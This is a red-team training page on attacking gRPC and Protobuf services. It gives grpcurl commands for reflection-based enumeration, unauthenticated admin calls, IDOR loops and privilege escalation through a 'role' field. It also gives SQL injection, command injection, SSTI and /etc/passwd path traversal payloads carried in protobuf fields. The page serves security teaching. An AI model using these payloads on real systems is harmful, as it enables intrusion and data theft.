---
layout: training-page
title: "gRPC & Protobuf Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - grpc
  - protobuf
  - api
  - microservices
  - deserialization
page_key: "web-grpc-attacks"
---

<h1>gRPC &amp; Protobuf Attacks</h1>

<p>gRPC is a high-performance RPC framework using HTTP/2 and Protocol Buffers (protobuf) for serialization. It's increasingly used in microservice architectures, internal APIs, mobile app backends, and cloud-native infrastructure. Unlike REST APIs, gRPC traffic is binary (not JSON), uses HTTP/2 framing, and often lacks the security controls applied to traditional web endpoints. Many organizations expose gRPC services without authentication, rate limiting, or input validation — making them a growing attack surface.</p>

<h2>gRPC Fundamentals</h2>

<pre><code># gRPC architecture:
# Client → HTTP/2 → gRPC Server
# Data is serialized as Protocol Buffers (binary, not JSON)
# Service definitions are in .proto files
#
# Key differences from REST:
# - Binary protocol (not human-readable in Burp/browser)
# - Uses HTTP/2 (multiplexed, bidirectional streaming)
# - Strongly typed via .proto schema
# - Content-Type: application/grpc
# - Default port: 50051 (but can be any port)
# - Often no authentication on internal services

# Common gRPC ports to scan:
# 50051 (default), 443 (with TLS), 8080, 9090, custom

# Detect gRPC services
nmap -sV -p 50051,443,8080,9090 TARGET
curl -v --http2-prior-knowledge http://TARGET:50051/
# Look for: HTTP/2, content-type: application/grpc</code></pre>

<h2>Reconnaissance &amp; Enumeration</h2>

<h3>gRPC Reflection</h3>

<pre><code># gRPC reflection allows clients to discover available services and methods
# at runtime — like WSDL for SOAP or Swagger for REST
# Many internal services leave reflection enabled in production

# grpcurl — command-line gRPC client (like curl for gRPC)
# Install: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List all services via reflection
grpcurl -plaintext TARGET:50051 list
# Output:
# grpc.reflection.v1alpha.ServerReflection
# myapp.UserService
# myapp.AdminService
# myapp.PaymentService

# Describe a service (shows all methods)
grpcurl -plaintext TARGET:50051 describe myapp.UserService
# Output:
# myapp.UserService is a service:
# service UserService {
#   rpc GetUser ( .myapp.GetUserRequest ) returns ( .myapp.UserResponse );
#   rpc ListUsers ( .myapp.ListUsersRequest ) returns ( .myapp.UserListResponse );
#   rpc CreateUser ( .myapp.CreateUserRequest ) returns ( .myapp.UserResponse );
#   rpc DeleteUser ( .myapp.DeleteUserRequest ) returns ( .myapp.Empty );
# }

# Describe a message type (shows fields)
grpcurl -plaintext TARGET:50051 describe myapp.GetUserRequest
# Output:
# myapp.GetUserRequest is a message:
# message GetUserRequest {
#   int32 user_id = 1;
#   string username = 2;
# }

# With TLS (skip certificate verification)
grpcurl -insecure TARGET:443 list</code></pre>

<h3>Without Reflection</h3>

<pre><code># If reflection is disabled, you need .proto files
# Sources:
# - Decompile mobile apps (APK/IPA often contain .proto definitions)
# - Source code repositories (search for *.proto files)
# - Binary analysis of compiled clients
# - Traffic capture + protobuf decoding

# Recover .proto from compiled binaries
# protoc compiler embeds descriptors in some output formats
# Use protobuf-inspector to decode raw protobuf messages:
pip install protobuf-inspector
echo -n "BINARY_DATA" | protobuf_inspector

# Decode unknown protobuf from network capture
# Protobuf messages can be partially decoded without the schema
# Fields are tagged with: field_number + wire_type
# Wire types: 0=varint, 1=64-bit, 2=length-delimited, 5=32-bit

# blackboxprotobuf — decode/encode without .proto files
pip install blackboxprotobuf
python3 -c "
import blackboxprotobuf
import binascii
data = binascii.unhexlify('0a0541646d696e10011a0a61646d696e40742e636f')
message, typedef = blackboxprotobuf.decode_message(data)
print(message)
print(typedef)
"</code></pre>

<h2>Calling gRPC Methods</h2>

<pre><code># Call a method with grpcurl
grpcurl -plaintext -d '{"user_id": 1}' TARGET:50051 myapp.UserService/GetUser

# List all users (empty request)
grpcurl -plaintext -d '{}' TARGET:50051 myapp.UserService/ListUsers

# Create a user
grpcurl -plaintext -d '{"username": "attacker", "email": "a@evil.com", "role": "admin"}' \
  TARGET:50051 myapp.UserService/CreateUser

# Delete a user
grpcurl -plaintext -d '{"user_id": 42}' TARGET:50051 myapp.UserService/DeleteUser

# With authentication (bearer token)
grpcurl -plaintext -H "Authorization: Bearer eyJ..." \
  -d '{"user_id": 1}' TARGET:50051 myapp.UserService/GetUser

# With TLS client certificate
grpcurl -cert client.pem -key client-key.pem -cacert ca.pem \
  -d '{}' TARGET:443 myapp.AdminService/ListUsers

# Streaming RPC (server-side streaming)
grpcurl -plaintext -d '{"query": "admin"}' TARGET:50051 myapp.UserService/SearchUsers

# Using proto file directly (when reflection is disabled)
grpcurl -plaintext -proto service.proto \
  -d '{"user_id": 1}' TARGET:50051 myapp.UserService/GetUser</code></pre>

<h2>Common Vulnerabilities</h2>

<h3>Missing Authentication</h3>

<pre><code># Internal gRPC services often have no authentication
# Especially common in Kubernetes clusters where services trust each other

# Test: call methods without any auth headers
grpcurl -plaintext -d '{}' TARGET:50051 myapp.AdminService/ListAllUsers

# If it returns data → no authentication required
# Try admin-sounding methods:
# - AdminService/*
# - InternalService/*
# - DebugService/*
# - HealthService/* (may leak internal info)</code></pre>

<h3>IDOR via gRPC</h3>

<pre><code># Enumerate user IDs or other identifiers
for id in $(seq 1 100); do
  echo "[*] User ID: $id"
  grpcurl -plaintext -d "{\"user_id\": $id}" TARGET:50051 myapp.UserService/GetUser 2&gt;&amp;1
  echo "---"
done

# Modify fields you shouldn't have access to
# If CreateUser has a "role" field, try setting it to "admin"
grpcurl -plaintext -d '{"username": "test", "role": "ADMIN", "is_superuser": true}' \
  TARGET:50051 myapp.UserService/CreateUser</code></pre>

<h3>Injection via Protobuf Fields</h3>

<pre><code># String fields in protobuf can carry injection payloads
# The gRPC server may pass field values to SQL, OS commands, or templates

# SQL injection via gRPC
grpcurl -plaintext -d '{"username": "admin'\'' OR 1=1--"}' \
  TARGET:50051 myapp.UserService/GetUserByName

# Command injection
grpcurl -plaintext -d '{"filename": "test; id; #"}' \
  TARGET:50051 myapp.FileService/ProcessFile

# SSTI via gRPC
grpcurl -plaintext -d '{"template": "{{7*7}}"}' \
  TARGET:50051 myapp.RenderService/RenderTemplate

# Path traversal
grpcurl -plaintext -d '{"path": "../../../etc/passwd"}' \
  TARGET:50051 myapp.FileService/ReadFile</code></pre>

<h3>Protobuf Deserialization Issues</h3>

<pre><code># Protobuf itself is safe from classic deserialization attacks
# (unlike Java serialization, Python pickle, etc.)
# BUT: applications may use protobuf messages containing:
# - google.protobuf.Any — can hold any message type
# - oneof fields — can switch between types unexpectedly
# - bytes fields — may contain nested serialized data

# google.protobuf.Any abuse:
# If the server accepts Any, you can send any message type
# and the server may process it in an unintended handler

# Field number confusion:
# Protobuf uses field numbers, not names
# If you send field 99 and the server has a hidden field 99
# (not in the public .proto), it may be processed
# Enumerate unknown field numbers:
python3 -c "
import struct
# Craft raw protobuf with unknown field numbers
for field_num in range(1, 200):
    tag = (field_num &lt;&lt; 3) | 2  # wire type 2 (length-delimited)
    value = b'AAAA'
    msg = bytes([tag]) + bytes([len(value)]) + value
    print(f'Field {field_num}: {msg.hex()}')
"</code></pre>

<h2>gRPC-Web</h2>

<pre><code># gRPC-Web is a browser-compatible variant that uses HTTP/1.1 or HTTP/2
# Content-Type: application/grpc-web or application/grpc-web+proto
# Commonly exposed on port 8080 behind an Envoy or nginx proxy

# Identify gRPC-Web endpoints
curl -s -H "Content-Type: application/grpc-web" \
  -H "X-Grpc-Web: 1" \
  -X POST https://TARGET/myapp.UserService/GetUser

# gRPC-Web can be intercepted with Burp Suite
# Install the "gRPC-Web Coder" Burp extension
# Or use mitmproxy with grpc-web decoding

# Decode gRPC-Web traffic manually
# gRPC-Web frames: 1-byte flag + 4-byte length + protobuf payload
python3 -c "
import base64, struct
# base64 decode gRPC-Web response
data = base64.b64decode('RESPONSE_BASE64')
flag = data[0]
length = struct.unpack('&gt;I', data[1:5])[0]
payload = data[5:5+length]
print(f'Flag: {flag}, Length: {length}')
# Decode payload with blackboxprotobuf
"</code></pre>

<h2>Tools</h2>

<pre><code># grpcurl — CLI gRPC client
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# grpcui — web-based gRPC UI (like Postman for gRPC)
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
grpcui -plaintext TARGET:50051
# Opens a browser UI to explore and call gRPC methods

# Burp Suite extensions:
# - gRPC-Web Coder — decode/encode gRPC-Web in Burp
# - Protobuf Decoder — decode raw protobuf in Burp

# blackboxprotobuf — decode protobuf without schema
pip install blackboxprotobuf

# protobuf-inspector — analyze raw protobuf
pip install protobuf-inspector

# mitmproxy — intercept gRPC traffic
# mitmproxy can decode HTTP/2 + protobuf with plugins

# pbtk (Protobuf Toolkit) — extract .proto from binaries
# github.com/nickcoutsos/pbtk-extractor</code></pre>

<h2>Resources</h2>

<ul>
  <li>grpcurl — <code>github.com/fullstorydev/grpcurl</code></li>
  <li>grpcui — <code>github.com/fullstorydev/grpcui</code></li>
  <li>blackboxprotobuf — <code>github.com/nccgroup/blackboxprotobuf</code></li>
  <li>gRPC Security — <code>grpc.io/docs/guides/auth</code></li>
  <li>"Hacking gRPC Services" — NCC Group research</li>
  <li>Protocol Buffers documentation — <code>protobuf.dev</code></li>
</ul>
